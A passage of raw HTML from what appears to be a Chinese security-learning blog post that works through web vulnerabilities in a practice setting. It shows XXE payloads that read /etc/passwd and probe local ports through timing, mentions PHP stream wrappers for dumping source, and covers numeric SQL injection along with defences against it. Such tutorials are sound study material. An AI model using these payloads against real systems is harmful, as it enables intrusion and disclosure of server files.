class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//爆破开放端口</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">noet</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:80&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//Linux下读取文件</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>正常xml数据测试:</p>
<p><img src="8.png"></p>
<p>查看服务器的内容:</p>
<p><img src="9.png"></p>
<p>使用php伪协议，打印base64编码后的xxe.php.解码即可看到相应内容。</p>
<p><img src="10.png"></p>
<p><img src="11.png"></p>
<blockquote>
<p>php伪协议：</p>
<p>PHP 带有很多内置 URL 风格的封装协议，支持 <code>scheme://...</code> 的语法</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li>
</ul>
<p>官方文档：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
</blockquote>
<p>爆破开放端口时，并无多余提示，但是处理速度不同，解析81端口时，速度明显慢于80端口。</p>
<p>看请求包和回应包的时间间隔来判断是否开放：</p>
<p><img src="12.png"></p>
<p><img src="15.jpg"></p>
<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。<br>从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
<p>一般会从以下方面来防止SQL注入漏洞：</p>
<ol>
<li>对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li>
<li>使用参数化（Parameterized Query 或 Parameterized Statement）；</li>
<li>目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需慎重</li>
</ol>
<h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><p>数字型注入，直接在包后面加上真命题，返回所有的数据库数据</p>
<p><img src="14.jpg"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1></script></li></ul>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">swanQ</p>
  <div class="site-description" itemprop="description">Try & Enjoy</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">49</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">swanQ</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">NaNm</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">NaN:aN</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
